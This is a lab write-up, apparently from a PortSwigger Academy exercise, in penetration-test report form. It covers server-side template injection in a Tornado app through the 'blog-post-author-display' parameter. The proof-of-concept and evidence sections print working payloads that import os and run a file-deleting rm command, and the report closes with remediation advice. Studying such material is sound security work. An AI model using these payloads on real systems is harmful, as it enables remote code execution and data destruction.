@@ -1,0 +1,302 @@
+# Basic Server-Side Template Injection (Code Context)
+
+> **Platform:** PortSwigger Web Security Academy  
+> **Category:** Server-Side Template Injection (SSTI)  
+> **Difficulty:** Practitioner  
+> **Status:** Solved
+
+---
+
+# Table of Contents
+
+1. Executive Summary
+2. Risk Classification
+3. Vulnerability Information
+4. Affected Asset
+5. Technical Description
+6. Methodology
+7. Relevant HTTP Requests
+8. Proof of Concept (PoC)
+9. Evidence
+10. Impact Analysis
+11. Root Cause
+12. Recommendations
+13. References
+14. Conclusion
+
+---
+
+# 1. Executive Summary
+
+The application was vulnerable to **Server-Side Template Injection (SSTI)** within the `blog-post-author-display` parameter.
+
+The application used the **Tornado** template engine to dynamically render the author's display name above blog comments. By injecting malicious template syntax into this parameter, it was possible to escape the original template context, execute arbitrary Python code on the server, and ultimately execute operating system commands.
+
+Successful exploitation resulted in arbitrary command execution and deletion of the target file:
+
+```
+/home/carlos/morale.txt
+```
+
+---
+
+# 2. Risk Classification
+
+| Classification | Value |
+|----------------|-------|
+| Severity | Critical |
+| CVSS v3.1 | 9.8 (Critical) |
+| CWE | CWE-1336 – Improper Neutralization of Special Elements Used in a Template Engine |
+| OWASP Top 10 | A03:2021 – Injection |
+
+---
+
+# 3. Vulnerability Information
+
+**Vulnerability Type**
+
+Server-Side Template Injection (SSTI)
+
+**Template Engine**
+
+```
+Tornado (Python)
+```
+
+**Injection Point**
+
+```
+blog-post-author-display
+```
+
+Endpoint:
+
+```
+POST /my-account/change-blog-post-author-display
+```
+
+---
+
+# 4. Affected Asset
+
+Authenticated user profile functionality responsible for configuring how the username is displayed above blog comments.
+
+Affected endpoint:
+
+```
+POST /my-account/change-blog-post-author-display
+```
+
+---
+
+# 5. Technical Description
+
+The application stored the value of the `blog-post-author-display` parameter and later inserted it directly into a Tornado template without proper validation or sanitization.
+
+Because the parameter was evaluated inside a template expression, it was possible to terminate the existing expression and inject arbitrary Tornado template syntax.
+
+This allowed arbitrary Python code execution using Tornado template directives.
+
+---
+
+# 6. Methodology
+
+1. Authenticate as a valid user.
+2. Publish a blog comment.
+3. Modify the preferred author display option.
+4. Intercept the request responsible for updating the display preference.
+5. Confirm SSTI by evaluating a mathematical expression.
+6. Inject Python code.
+7. Execute an operating system command through the `os` module.
+8. Reload the blog post to trigger template rendering.
+
+---
+
+# 7. Relevant HTTP Requests
+
+## 7.1 Original Request
+
+```http
+POST /my-account/change-blog-post-author-display HTTP/1.1
+
+blog-post-author-display=user.name
+```
+
+---
+
+## 7.2 SSTI Detection
+
+Injected payload:
+
+```text
+blog-post-author-display=user.name}}{{7*7}}
+```
+
+---
+
+## 7.3 Command Execution
+
+Injected payload:
+
+```text
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+```
+
+---
+
+# 8. Proof of Concept (PoC)
+
+## Step 1 – Confirm Template Injection
+
+Payload:
+
+```tornado
+{{7*7}}
+```
+
+Injected as:
+
+```text
+user.name}}{{7*7}}
+```
+
+After reloading the page containing the comment, the author's name became:
+
+```
+Peter Wiener49}}
+```
+
+This confirmed that the Tornado template engine evaluated the injected expression.
+
+---
+
+## Step 2 – Execute Arbitrary Python
+
+The payload imported the Python `os` module:
+
+```python
+{% import os %}
+```
+
+Then executed:
+
+```python
+os.system('rm /home/carlos/morale.txt')
+```
+
+Final payload:
+
+```text
+user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
+```
+
+---
+
+# 9. Evidence
+
+## Detection Payload
+
+```text
+blog-post-author-display=user.name}}{{7*7}}
+```
+
+Result displayed:
+
+```
+Peter Wiener49}}
+```
+
+---
+
+## Command Execution Payload
+
+```text
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+```
+
+Reloading the blog post executed the injected template code, deleting the target file and solving the laboratory.
+
+---
+
+# 10. Impact Analysis
+
+A successful attacker can execute arbitrary Python code on the server.
+
+Potential consequences include:
+
+- Remote Code Execution (RCE)
+- Reading sensitive files
+- Modifying application data
+- Executing operating system commands
+- Privilege escalation
+- Deploying malware
+- Complete server compromise
+
+This vulnerability represents one of the highest-impact classes of web application vulnerabilities.
+
+---
+
+# 11. Root Cause
+
+The application renders user-controlled data directly inside Tornado template expressions.
+
+No validation or escaping is performed before rendering, allowing attackers to inject arbitrary template syntax.
+
+The template engine executes injected Python code with the privileges of the web application.
+
+---
+
+# 12. Recommendations
+
+## Critical
+
+Never render user-controlled input directly inside server-side templates.
+
+## Critical
+
+Use automatic escaping and strict context separation provided by the template engine.
+
+## High
+
+Validate user input using allowlists instead of blocklists.
+
+## High
+
+Disable access to dangerous Python modules whenever possible.
+
+## Medium
+
+Run the application using a low-privileged operating system account.
+
+## Medium
+
+Implement server-side monitoring for template syntax such as:
+
+```
+{{
+}}
+{%
+%}
+```
+
+---
+
+# 13. References
+
+- PortSwigger Web Security Academy – Server-Side Template Injection
+- Tornado Template Documentation
+- Python Documentation – os Module
+- OWASP Server-Side Template Injection
+- CWE-1336
+
+---
+
+# 14. Conclusion
+
+The assessment confirmed the presence of a **Server-Side Template Injection (SSTI)** vulnerability within the Tornado template engine.
+
+By escaping the original template context, arbitrary template expressions were successfully evaluated. This allowed execution of arbitrary Python code through the `os` module and resulted in operating system command execution.
+
+The vulnerability ultimately enabled deletion of the target file, demonstrating that an attacker could fully compromise the underlying server if additional security controls were not in place.
+
+Because SSTI frequently leads to Remote Code Execution, it should be considered a **Critical** vulnerability and remediated immediately.
